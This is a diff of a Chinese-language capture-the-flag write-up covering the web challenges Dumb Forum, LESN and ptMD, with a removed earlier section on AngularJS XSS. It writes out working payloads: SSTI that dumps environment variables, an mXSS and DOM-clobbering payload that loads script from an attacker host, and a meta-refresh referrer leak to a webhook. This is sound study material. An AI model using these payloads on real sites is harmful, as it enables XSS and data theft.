@@ -1,82 +1,285 @@
-<!-- more -->
+## Dumb Forum
 
-## DOM-based race condition
+這題有個 SSTI：
 
-來源：https://twitter.com/ryotkak/status/1710291366654181749
+``` py
+@app.route('/profile', methods=['GET', 'POST'])
+@login_required
+def profile():
+    with open('app/templates/profile.html') as p:
+        profile_html = p.read()
+    
+    profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)
 
-題目很簡單，就給你一個可編輯的 div 加上 Angular，允許任何的 user interaction，要做到 XSS。
-
-``` html
-<div contenteditable></div>
-<script src="https://angular-no-http3.ryotak.net/angular.min.js"></script>
+    if(current_user.about_me == None):
+        current_user.about_me = ""
+    return render_template_string(profile_html)
 ```
 
-當初看到題目的時候有猜到應該跟 copy paste 有關，解答中有提到說在 `<div contenteditable></div>` 貼上內容時，是可以貼上 HTML 的。雖然瀏覽器後來有做 sanitizer，但並不會針對自訂的屬性。
+username 跟 aboutme 都有被檢查，不能用 `}{`，而 email 只有檢查是不是合法的 email 地址，是的話就能用。
 
-也就是說，如果搭配其他 gadget 的話，還是有機會做到 XSS。
+因此 `abc｛{7*7}}@abc.com` 在界面上呈現的會是 `abc49@abc.com`，因為在這套 library 中 email 地址如果有 `()` 的話會被視為不合法，所以沒辦法用 `()`。
 
-例如說作者的文章中提到的這個 pattern，因為有 AngularJS 的關係所以會執行程式碼：
+flag 在環境變數裡面，所以只要這樣就 win 了：
 
-``` html
-<html ng-app>
-  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
-  <div ng-init="constructor.constructor('alert(1)')()"></div>
-</html>
+``` py
+{{cycler.__init__.__globals__.os.environ}}@x.com
 ```
 
-但問題是使用者在貼入 payload 的時候，AngularJS 已經載入完畢了。載入完成的時候如果 payload 還不存在，那就不會被執行，所以需要延長 AngularJS 載入的時間。
+## LESN
 
-最後作者是用 connection pool 來解決這問題的，就是把 pool 塞爆，就可以延長 script 的載入時間，在載入完成以前貼好 payload。
+這題可以建立一個 post，內容可以控制但會被 sanitized，最後會 render 成這樣：
+
+``` ejs
+<script src="/static/script.js" async></script>
+
+<a style="position: absolute; left: 30%; top:5px" href="/">Home</a>
+<a style="position: absolute; right: 30%; top:5px" href="/edit/<%= imgid %>">Edit</a>
+
+<div style="margin-top: 3em;">
+    <img src="<%= imgurl %>" onerror="setTimeout(redirect_error_image,1500)"
+        style="max-height: 300px; max-width: 300px; display:block; margin: auto; border: 2px solid #555;">
+
+    <div style="margin-top: 30px; text-align: center;"><%- description %></div>
+</div>
 
 
-作者 writeup：https://blog.ryotak.net/post/dom-based-race-condition/
+<%- include('footer') %>
+```
 
-## 罕見的 Content-type 與 UTF16
+過濾的程式碼長這樣：
 
-來源：https://twitter.com/avlidienbrunn/status/1703805922043220273
+``` js
+const createDOMPurify = require('dompurify');
+const { JSDOM } = require('jsdom');
 
-題目如下：
+const window = new JSDOM('').window;
+const DOMPurify = createDOMPurify(window);
 
-``` php
-<?php
-/*
-FROM php:7.0-apache
+function my_sanitize(html) {
+    const document = new JSDOM('').window.document
+    document.body.outerHTML = html
 
-RUN a2dismod status
+    let node;
+    const iter = document.createNodeIterator(document.body)
 
-COPY ./files/index.php /var/www/html
-COPY ./files/harder.php /var/www/html
-EXPOSE 80
+    while (node = iter.nextNode()) {
+        if (/(script|iframe|frame|object|data|m.+)/i.test(node.nodeName)) {
+            node.parentNode.removeChild(node)
+            continue
+        }
 
-*/
-$message = isset($_GET['message']) ? $_GET['message'] : 'hello, world';
-$type = isset($_GET['type']) ? $_GET['type'] : die(highlight_file(__FILE__));
-header("Content-Type: text/$type");
-header("X-Frame-Options: DENY");
 
-if($type == "plain"){
-    die("the message is: $message");
+        if (node.attributes) {
+            for (let i = node.attributes.length - 1; i >= 0; i--) {
+                const att = node.attributes[i]
+                if (! /(class|src|style)/i.test(att.name)) {
+                    node.removeAttributeNode(att)
+                }
+            }
+        }
+    }
+
+    return document.body.innerHTML
 }
 
-?>
+function sanitize(html) {
+
+    let clean = my_sanitize(html)
+
+    clean = DOMPurify.sanitize(clean)
+
+    return clean
+}
+
+
+module.exports = { sanitize }
+```
+
+最後有經過 DOMPurify，所以危險的 tag 都不能用。
+
+這題的重點是我在看的時候，發現有時候 console 會出現 `redirect_error_image is undefined` 的錯誤。
+
+這是因為 script 是用 async 來載入，所以有個 race condition 的問題。如果 img 的 `onerror` 在 script 載入前就被觸發，那 `redirect_error_image` 就會是 undefined。
+
+利用這個特點，勝利方程式就是用 DOM clobbering 去控制 `redirect_error_image`，再加上 `setTimeout` 第一個參數傳字串就跟 `eval` 差不多的特性去執行任意程式碼。
+
+DOM clobbering 的部分要先繞掉自訂的 parser，這部分由隊友完成，原理大概就是這篇：[HTML sanitization bypass in Ruby Sanitize < 5.2.1](https://research.securitum.com/html-sanitization-bypass-in-ruby-sanitize-5-2-1/) 講的，利用 namespace confusiion 來製造出 mXSS，payload 長這樣：
+
+``` html
+<svg><style><&sol;style><&sol;svg>&lt;a id=redirect_error_image href=http:pew>g
+```
+
+jsdom 會把上面的段落 parse 成這樣：
+
+```
+BODY
+-> svg
+---> style
+------> #text: </style></svg><a id=redirect_error_image href=http:pew>g
+```
+
+就只是一個 style 有著內容，沒什麼，但是用 `document.body.innerHTML` 還原回去時會變成這樣：
+
+``` html
+<svg><style></style></svg><a id=redirect_error_image href=http:pew>g</style></svg>
+```
+
+就產生出了這個 `<a>` 的 tag，讓我們可以 DOM clobbering。而內容其實放個 `http:import(script)` 就好，`http:` 會被當作是 label，後面的程式碼會直接被執行。
+
+接著就是要怎麼讓 onerror 發生的比腳本載入快，根據作者的 [writeup](https://github.com/xatophi/m0leconteaser2022-LESN/blob/main/writeup.md)，在圖片網址的部分可以放上 `http://localhost` 之類的網址，讓它趕快失敗，放 `http://not_exist` 感覺也行。
+
+然後可以用 iframe 去載入你的 post，再把自訂頁面丟給 bot，就可以避免使用到 cached 的 `script.js`。
+
+我那時是想說瀏覽器載入資源都有 priority，如果可以製造出一個 priority 比 script.js 還高的組合，就能延緩腳本的載入之類的，所以試著在頁面中加入一堆圖片：
+
+``` html
+<svg><style><&sol;style><&sol;svg>&lt;a id=redirect_error_image href=mailto:import('//vps/exploit.js')>
+&lt;img src=https://deelay.me/20000/https://example.com>
+&lt;img src=https://deelay.me/20001/https://example.com>
+&lt;img src=https://deelay.me/20002/https://example.com>
+&lt;img src=https://deelay.me/20003/https://example.com>
+```
+
+不過好像沒什麼用就是了，圖片順序應該也不會比 script 還高。當時也沒有繼續研究有哪些可以做到我理想中的狀況。
+
+最後是想到之前 @lbrnli1234 在解我出的一題 XSS 時也碰到 race condition，它後來就塞了一堆 iframe 來增加成功機率，可見：[Notes XSS Challenge Author Writeup](https://blog.huli.tw/2022/04/13/en/notes-challenge-author-writeup/)
+
+我也照著做，塞了一堆 iframe：
+
+``` html
+<!DOCTYPE html>
 <html>
-<h1>The message is:</h1>
-<hr/>
-<pre>
-    <input type="text" value="<?php echo preg_replace('/([^\s\w!-~]|")/','',$message);?>">
-</pre>
-<br>
-solved by:
-<li> nobody yet!</li>
+<head>
+</head>
+<body>
+
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
+</body>
+
 </html>
 ```
 
-可以控制部分內容以及部分 content type，該怎麼做到 XSS？
+最後就解掉了，first blood。
 
-第一招是讓 content type 為 `text/html; charset=UTF-16LE`，就可以讓瀏覽器把頁面解讀為 UTF16，控制輸出內容。
+## ptMD
 
-這招讓我想到了 [UIUCTF 2022](https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup/) 中的 modernism 那題。
+本次最難，全場一解。
 
-第二招是先運用 content type header 的特性，當 response header 是 `Content-Type: text/x,image/gif` 時，因為 `text/x` 是非法的 content type，所以瀏覽器會優先看合法的 `image/gif`。
+先附上作者 wirteup：https://github.com/xatophi/m0leconteaser2022-ptMD/blob/main/writeup.md
 
-也就是說，儘管 content type 的前半段是寫死的，依然可以利用這個技巧覆蓋掉完整的 content type。而有一個古老的 content type 叫做 `multipart/mixed`，像是 response 版的 multipart/form，可以輸出像這樣的 response：
+簡單來說你有個頁面，你可以插入任意 HTML，但是 CSP 是 `script-src 'self'`，所以沒辦法 XSS。
+
+目標是偷到 admin note 的內容，由於網址是唯一的而且沒有權限管理，所以偷到網址其實就行了。在 client 的頁面有個 `last` 可以點，點下去之後就會到最新的 note 頁面去。
+
+這邊因為是用 react 做的，所以如果你直接把網址設定成 `/last` 是沒用的，因為剛載入的時候 notes 是空的，所以並不會重新導向到最新的 note 去。
+
+這題的 admin bot 長這樣：
+
+``` js
+async function visit(url) {
+    const browser = await puppeteer.launch({
+        headless: true,
+        args: [
+            '--disable-default-apps',
+            '--disable-extensions',
+            '--disable-gpu',
+            '--disable-sync',
+            '--disable-translate',
+            '--hide-scrollbars',
+            '--metrics-recording-only',
+            '--mute-audio',
+            '--no-first-run',
+            '--no-sandbox',
+            '--safebrowsing-disable-auto-update'
+        ],
+        executablePath: '/usr/bin/chromium'
+    })
+
+
+    try {
+        let page = await browser.newPage()
+
+        //login
+        await page.goto(LOGIN_URL)
+
+        await page.waitForSelector('#username')
+        await page.focus('#username')
+        await page.keyboard.type('admin', { delay: 10 })
+        await page.focus('#password')
+        await page.keyboard.type(ADMIN_PASSWORD, { delay: 10 })
+
+        await new Promise(resolve => setTimeout(resolve, 300))
+        await page.click('#submit')
+        await new Promise(resolve => setTimeout(resolve, 300))
+
+        //await page.waitForNavigation({ waitUntil: 'networkidle2' })
+        console.log(await page.cookies())
+
+        // visit URL after auth
+        await page.goto(url, { timeout: 5000 })
+        await new Promise(resolve => setTimeout(resolve, 2000))
+
+        // logout
+        await page.click('#logout')
+        await new Promise(resolve => setTimeout(resolve, 2000))
+
+        // close browser
+        await page.close()
+        await browser.close()
+    } catch (e) {
+        console.log(e)
+        await browser.close()
+        //throw (e)
+    }
+
+}
+```
+
+最後一步我在看的時候就覺得怪怪的，就是去點擊那個 logout button，我就在想為什麼要點那個，賽後才知道那也是關鍵之一。
+
+我在解的時候有想到可能跟 referrer policy 有關，但用了 `<iframe referrerPolicy="unsafe-url"></iframe>` 似乎沒有效果。
+
+解答確實跟這個有關，但是是這樣的：
+
+``` html
+<meta name="referrer" content="unsafe-url" />
+<meta http-equiv="refresh" content="3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef" />
+```
+
+用 `<meta>` 來設置 referrer，然後再用 `meta refresh` 設定三秒後把頁面重新導向。
+
+然後再用 CSS 把 logout button 的位置藏到 `last` button 後面，這樣 admin bot 實際上就會點到 `last` button，跳到 note 頁面，接著靠著 referrer policy 就可以 leak 出 URL。
+
+最後這個答案打破了三件我以為的認知：
+
+1. 我以為 meta 要放在 head 裡面才有效
+2. 我以為 meta tag 被清掉之後就沒效了
+3. 我以為 puppeteer 點按鈕的時候跟畫面無關，而是會直接點到元素
+
+針對這三件事情，我們都可以來做一個小實驗。
+
+第一點我做了一個簡單的網頁：
+
+``` html
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset='utf-8'>
+</head>
+<body>
+  <h1>test</h1>
+  <meta name="referrer" content="unsafe-url" />
+  <meta http-equiv="Content-Security-Policy"
+      content="default-src 'self'; img-src https://*; child-src 'none';">
+  <meta http-equiv="refresh" content="3;url=http://example.org" />
